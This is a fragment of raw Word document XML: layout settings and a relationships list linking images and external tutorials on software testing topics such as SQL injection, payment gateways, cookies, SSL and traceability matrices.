            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
      </w:divsChild>
    </w:div>
    <w:div w:id="1999265872">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="2014649273">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="2038120790">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="2040619861">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="2087878327">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="2110466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twitter.com/share" TargetMode="External"/><Relationship Id="rId42" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://websec.ca/kb/sql_injection" TargetMode="External"/><Relationship Id="rId63" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://cdn.guru99.com/images/2013/04/how_cookies_work.png" TargetMode="External"/><Relationship Id="rId84" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image24.jpeg"/><Relationship Id="rId138" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.opencodez.com/software-testing/create-requirement-traceability-matrix-rtm-free-sample-download.htm" TargetMode="External"/><Relationship Id="rId159" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image59.jpeg"/><Relationship Id="rId170" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://cdn.softwaretestinghelp.com/wp-content/qa/uploads/2014/06/test-report-template.jpg" TargetMode="External"/><Relationship Id="rId191" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.smashingmagazine.com/2012/02/beginners-guide-jquery-based-json-api-clients/" TargetMode="External"/><Relationship Id="rId205" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.json.org/" TargetMode="External"/><Relationship Id="rId226" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image85.jpeg"/><Relationship Id="rId247" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://msdn.microsoft.com/en-us/library/ms978235.aspx" TargetMode="External"/><Relationship Id="rId107" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image41.jpeg"/><Relationship Id="rId268" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image98.png"/><Relationship Id="rId11" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.guru99.com/payment-gateway-testing-tutorial-with-sample-test-cases.html" TargetMode="External"/><Relationship Id="rId32" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.differencebetween.net/technology/difference-between-xml-and-xsd/" TargetMode="External"/><Relationship Id="rId53" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image5.wmf"/><Relationship Id="rId74" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image14.jpeg"/><Relationship Id="rId128" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://cdn.guru99.com/images/1-2015/012615_1111_Requirement5.png" TargetMode="External"/><Relationship Id="rId149" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.softwaretestinghelp.com/writing-test-strategy-document-template/" TargetMode="External"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/webSettings" Target="webSettings.xml"/><Relationship Id="rId95" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image35.jpeg"/><Relationship Id="rId160" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://cdn.softwaretestinghelp.com/wp-content/qa/uploads/2014/06/test-summary-report-4.jpg" TargetMode="External"/><Relationship Id="rId181" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://agilepainrelief.com/notesfromatooluser/2011/07/the-scrummaster-tales.html" TargetMode="External"/><Relationship Id="rId216" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image77.png"/><Relationship Id="rId237" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image91.jpeg"/><Relationship Id="rId258" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.checkfree.com/" TargetMode="External"/><Relationship Id="rId279" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/200" TargetMode="External"/><Relationship Id="rId22" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.thegeekstuff.com/2012/02/sql-injection-attacks/" TargetMode="External"/><Relationship Id="rId43" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.tizag.com/mysqlTutorial/mysql-php-sql-injection.php" TargetMode="External"/><Relationship Id="rId64" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image8.png"/><Relationship Id="rId118" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://cdn.guru99.com/images/3-2016/032816_1141_SSLCertific6.png" TargetMode="External"/><Relationship Id="rId139" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.softwaretestingtimes.com/2010/04/traceability-matrix-from-software.html" TargetMode="External"/><Relationship Id="rId85" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image25.jpeg"/><Relationship Id="rId150" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.softwaretestinghelp.com/test-plan-sample-softwaretesting-and-quality-assurance-templates/" TargetMode="External"/><Relationship Id="rId171" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image65.jpeg"/><Relationship Id="rId192" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.json.org/" TargetMode="External"/><Relationship Id="rId206" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image71.png"/><Relationship Id="rId227" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://cdn.softwaretestinghelp.com/wp-content/qa/uploads/2016/06/Testing-ecommerce-websites-3.jpg" TargetMode="External"/><Relationship Id="rId248" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://netmechanic.com/" TargetMode="External"/><Relationship Id="rId269" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image99.png"/><Relationship Id="rId12" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.guru99.com/payment-gateway-testing-tutorial-with-sample-test-cases.html" TargetMode="External"/><Relationship Id="rId33" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.differencebetween.net/language/difference-between-would-and-should/" TargetMode="External"/><Relationship Id="rId108" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://cdn.guru99.com/images/3-2016/032816_1141_SSLCertific1.png" TargetMode="External"/><Relationship Id="rId129" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image52.png"/><Relationship Id="rId280" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/301" TargetMode="External"/><Relationship Id="rId54" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX1.xml"/><Relationship Id="rId75" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image15.jpeg"/><Relationship Id="rId96" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://cdn2.softwaretestinghelp.com/wp-content/qa/uploads/2014/03/mobile-application-testing-1.jpg" TargetMode="External"/><Relationship Id="rId140" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.tutorialspoint.com/software_testing_dictionary/requirements_traceability_matrix.htm" TargetMode="External"/><Relationship Id="rId161" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image60.jpeg"/><Relationship Id="rId182" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://agilepainrelief.com/agile-training-overview/certified-scrummaster-training" TargetMode="External"/><Relationship Id="rId217" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image78.png"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.testingexcellence.com/can-you-really-automate-a-user-journey/" TargetMode="External"/><Relationship Id="rId238" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image92.jpeg"/><Relationship Id="rId259" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.microsoft.com/technet/itsolutions/ecommerce/plan/ecseries.mspx" TargetMode="External"/><Relationship Id="rId23" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://istqbexamcertification.com/what-is-functional-testing-testing-of-functions-in-software/" TargetMode="External"/><Relationship Id="rId119" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image47.png"/><Relationship Id="rId270" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image100.png"/><Relationship Id="rId44" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://larrysteinle.com/2011/02/20/use-regular-expressions-to-detect-sql-code-injection/" TargetMode="External"/><Relationship Id="rId65" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://cdn.guru99.com/images/2013/04/cookie_empty_array.png" TargetMode="External"/><Relationship Id="rId86" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image26.jpeg"/><Relationship Id="rId130" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://cdn.guru99.com/images/1-2015/012615_1111_Requirement6.png" TargetMode="External"/><Relationship Id="rId151" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.softwaretestinghelp.com/risk-management-during-test-planning-risk-based-testing/" TargetMode="External"/><Relationship Id="rId172" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image66.png"/><Relationship Id="rId193" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://cran.r-project.org/web/packages/jsonlite/vignettes/json-apis.html" TargetMode="External"/><Relationship Id="rId207" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.geonames.org/export/ws-overview.html" TargetMode="External"/><Relationship Id="rId228" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image86.jpeg"/><Relationship Id="rId249" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.linkalarm.com/index.html" TargetMode="External"/><Relationship Id="rId13" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.guru99.com/payment-gateway-testing-tutorial-with-sample-test-cases.html" TargetMode="External"/><Relationship Id="rId18" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://httpd.apache.org/" TargetMode="External"/><Relationship Id="rId39" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://msdn.microsoft.com/en-us/library/ff648339.aspx" TargetMode="External"/><Relationship Id="rId109" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image42.png"/><Relationship Id="rId260" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://i0.wp.com/www.softwaretestingmaterial.com/wp-content/uploads/2016/06/one-tier-software-architecture.png?ssl=1" TargetMode="External"/><Relationship Id="rId265" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image96.png"/><Relationship Id="rId281" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/404" TargetMode="External"/><Relationship Id="rId34" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image3.png"/><Relationship Id="rId50" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.guru99.com/adhoc-testing.html" TargetMode="External"/><Relationship Id="rId55" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://demo.guru99.com/V4" TargetMode="External"/><Relationship Id="rId76" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image16.jpeg"/><Relationship Id="rId97" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image36.jpeg"/><Relationship Id="rId104" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://cdn.softwaretestinghelp.com/wp-content/qa/uploads/2014/03/mobile-device-emulator-5.jpg" TargetMode="External"/><Relationship Id="rId120" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://cdn.guru99.com/images/1-2015/012615_1111_Requirement1.png" TargetMode="External"/><Relationship Id="rId125" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image50.png"/><Relationship Id="rId141" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://en.wikipedia.org/wiki/Traceability_matrix" TargetMode="External"/><Relationship Id="rId146" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.guru99.com/how-precaution-becomes-cure-risk-analysis-and-solutions-in-test-management.html" TargetMode="External"/><Relationship Id="rId167" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image63.jpeg"/><Relationship Id="rId188" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.example.com/action.php?name=john&amp;age=24" TargetMode="External"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.testingexcellence.com/web-testing-tips-how-to-test-web-applications/" TargetMode="External"/><Relationship Id="rId71" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image12.png"/><Relationship Id="rId92" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image32.jpeg"/><Relationship Id="rId162" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://cdn.softwaretestinghelp.com/wp-content/qa/uploads/2014/06/test-summary-report-5.jpg" TargetMode="External"/><Relationship Id="rId183" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://agilepainrelief.com/notesfromatooluser/2010/12/more-notes-on-story-splitting.html" TargetMode="External"/><Relationship Id="rId213" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image74.png"/><Relationship Id="rId218" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image79.png"/><Relationship Id="rId234" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://cdn.softwaretestinghelp.com/wp-content/qa/uploads/2016/06/Testing-ecommerce-websites-6.jpg" TargetMode="External"/><Relationship Id="rId239" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://msdn.microsoft.com/en-us/library/ms978235.aspx" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml"/><Relationship Id="rId29" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.differencebetween.net/category/technology/software-technology/" TargetMode="External"/><Relationship Id="rId250" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://websitegarage.netscape.com/" TargetMode="External"/><Relationship Id="rId255" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.cylink.com/" TargetMode="External"/><Relationship Id="rId271" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/Identifying_resources_on_the_Web" TargetMode="External"/><Relationship Id="rId276" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/POST" TargetMode="External"/><Relationship Id="rId24" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://istqbexamcertification.com/what-is-non-functional-testing-testing-of-software-product-characteristics/" TargetMode="External"/><Relationship Id="rId40" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://msdn.microsoft.com/en-us/library/ms161953(SQL.105).aspx" TargetMode="External"/><Relationship Id="rId45" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image4.png"/><Relationship Id="rId66" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image9.png"/><Relationship Id="rId87" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image27.jpeg"/><Relationship Id="rId110" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://cdn.guru99.com/images/3-2016/032816_1141_SSLCertific2.png" TargetMode="External"/><Relationship Id="rId115" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image45.png"/><Relationship Id="rId131" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image53.png"/><Relationship Id="rId136" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.guru99.com/traceability-matrix.html" TargetMode="External"/><Relationship Id="rId157" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image58.jpeg"/><Relationship Id="rId178" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image69.png"/><Relationship Id="rId61" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.guru99.com/an-expert-view-on-test-estimation.html" TargetMode="External"/><Relationship Id="rId82" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image22.jpeg"/><Relationship Id="rId152" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://cdn2.softwaretestinghelp.com/wp-content/qa/uploads/2014/06/test-reporting.jpg" TargetMode="External"/><Relationship Id="rId173" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://lh4.ggpht.com/_dIl2j8iaPMg/Skdl_8Ex6aI/AAAAAAAABA0/u97LjwIVse0/s1600-h/image%5b2%5d.png" TargetMode="External"/><Relationship Id="rId194" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.geonames.org/export/ajax-postalcode-autocomplete.html" TargetMode="External"/><Relationship Id="rId199" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://api.geonames.org/wikipediaSearch?q=london&amp;maxRows=10&amp;username=demo" TargetMode="External"/><Relationship Id="rId203" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://maps.googleapis.com/maps/api/staticmap?center=Sydney,NSW&amp;zoom=14&amp;size=400x400&amp;sensor=false" TargetMode="External"/><Relationship Id="rId208" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://api.geonames.org/citiesJSON?north=44.1&amp;south=-9.9&amp;east=-22.4&amp;west=55.2&amp;lang=de&amp;username=demo" TargetMode="External"/><Relationship Id="rId229" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://cdn.softwaretestinghelp.com/wp-content/qa/uploads/2016/06/Testing-ecommerce-websites-4.jpg" TargetMode="External"/><Relationship Id="rId19" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://tomcat.apache.org/" TargetMode="External"/><Relationship Id="rId224" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image84.jpeg"/><Relationship Id="rId240" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://msdn.microsoft.com/en-us/library/ms978235.aspx" TargetMode="External"/><Relationship Id="rId245" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://msdn.microsoft.com/en-us/library/ms978235.aspx" TargetMode="External"/><Relationship Id="rId261" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image93.png"/><Relationship Id="rId266" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.softwaretestingclass.com/what-is-difference-between-two-tier-and-three-tier-architecture/three-tier-architecture/" TargetMode="External"/><Relationship Id="rId14" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.guru99.com/images/6-2015/payment_gateway.png" TargetMode="External"/><Relationship Id="rId30" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.differencebetween.net/technology/difference-between-data-warehousing-and-data-marts/" TargetMode="External"/><Relationship Id="rId35" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://dev.mysql.com/doc/refman/5.7/en/glossary.html" TargetMode="External"/><Relationship Id="rId56" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://docs.google.com/document/d/1PZQZKt7hqS417QjYRMppPnTwfj8V54XUA7nZUnYvumE/edit?usp=sharing" TargetMode="External"/><Relationship Id="rId77" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image17.jpeg"/><Relationship Id="rId100" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://cdn2.softwaretestinghelp.com/wp-content/qa/uploads/2014/03/mobile-device-emulator-3.jpg" TargetMode="External"/><Relationship Id="rId105" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image40.jpeg"/><Relationship Id="rId126" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://cdn.guru99.com/images/1-2015/012615_1111_Requirement4.png" TargetMode="External"/><Relationship Id="rId147" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.demo.guru99.com/V4" TargetMode="External"/><Relationship Id="rId168" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://cdn.softwaretestinghelp.com/wp-content/qa/uploads/2014/06/test-summary-report-8.jpg" TargetMode="External"/><Relationship Id="rId282" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image101.png"/><Relationship Id="rId8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.pcisecuritystandards.org/" TargetMode="External"/><Relationship Id="rId51" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.tutorialspoint.com/software_testing_dictionary/adhoc_testing.htm" TargetMode="External"/><Relationship Id="rId72" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.slideshare.net/LenaDSS/cookies-and-sessions" TargetMode="External"/><Relationship Id="rId93" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image33.jpeg"/><Relationship Id="rId98" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://cdn.softwaretestinghelp.com/wp-content/qa/uploads/2014/03/mobile-device-emulator-2.jpg" TargetMode="External"/><Relationship Id="rId121" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image48.png"/><Relationship Id="rId142" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.guru99.com/software-testing.html" TargetMode="External"/><Relationship Id="rId163" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image61.jpeg"/><Relationship Id="rId184" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://agilepainrelief.com/notesfromatooluser/2011/03/basic-explanation-of-the-different-parts-of-agile-planning.html" TargetMode="External"/><Relationship Id="rId189" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://stackoverflow.com/questions/21092164/yahoo-weather-api-celsius" TargetMode="External"/><Relationship Id="rId219" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image80.png"/><Relationship Id="rId3" Type="http://schemas.microsoft.com/office/2007/relationships/stylesWithEffects" Target="stylesWithEffects.xml"/><Relationship Id="rId214" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image75.png"/><Relationship Id="rId230" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image87.jpeg"/><Relationship Id="rId235" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image90.jpeg"/><Relationship Id="rId251" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.webperfcenter.com/" TargetMode="External"/><Relationship Id="rId256" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.terisa.com/" TargetMode="External"/><Relationship Id="rId277" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://developer.mozilla.org/en-US/docs/Web/Guide/HTML/Forms" TargetMode="External"/><Relationship Id="rId25" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://istqbexamcertification.com/what-is-structural-testing-testing-of-software-structurearchitecture/" TargetMode="External"/><Relationship Id="rId46" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://st9.idsil.com/test/tcs/admin/dashboard/editusers/%60" TargetMode="External"/><Relationship Id="rId67" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://cdn.guru99.com/images/2013/04/cookie_60_seconds.png" TargetMode="External"/><Relationship Id="rId116" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://cdn.guru99.com/images/3-2016/032816_1141_SSLCertific5.png" TargetMode="External"/><Relationship Id="rId137" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.softwaretestinghelp.com/requirements-traceability-matrix/" TargetMode="External"/><Relationship Id="rId158" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://cdn.softwaretestinghelp.com/wp-content/qa/uploads/2014/06/test-summary-report-3.jpg" TargetMode="External"/><Relationship Id="rId272" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://developer.mozilla.org/en-US/docs/Web/API/Fetch" TargetMode="External"/><Relationship Id="rId20" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://tomcat.apache.org/" TargetMode="External"/><Relationship Id="rId41" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://sqlzoo.net/hack/24table.htm" TargetMode="External"/><Relationship Id="rId62" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image7.png"/><Relationship Id="rId83" 